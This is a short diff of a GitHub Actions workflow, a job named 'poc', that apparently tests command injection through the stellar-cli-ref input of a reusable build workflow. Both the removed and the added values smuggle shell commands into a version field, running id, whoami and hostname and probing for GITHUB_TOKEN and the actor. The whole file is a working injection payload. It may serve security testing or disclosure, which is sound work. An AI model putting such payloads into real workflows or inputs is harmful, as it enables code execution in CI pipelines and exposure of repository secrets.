@@ -7,4 +7,4 @@ jobs:
   poc:
     uses: ./.github/workflows/build.yml
     with:
-      stellar-cli-ref: "main' && echo '[PoC-START]' && id && whoami && hostname && echo 'GITHUB_TOKEN_PRESENT='${#GITHUB_TOKEN} && echo '[PoC-END]' && echo '"
+      stellar-cli-ref: "v27.0.0; whoami; hostname; id; echo GITHUB_TOKEN_LEN=${#GITHUB_TOKEN}; echo ACTOR=$GITHUB_ACTOR; #"
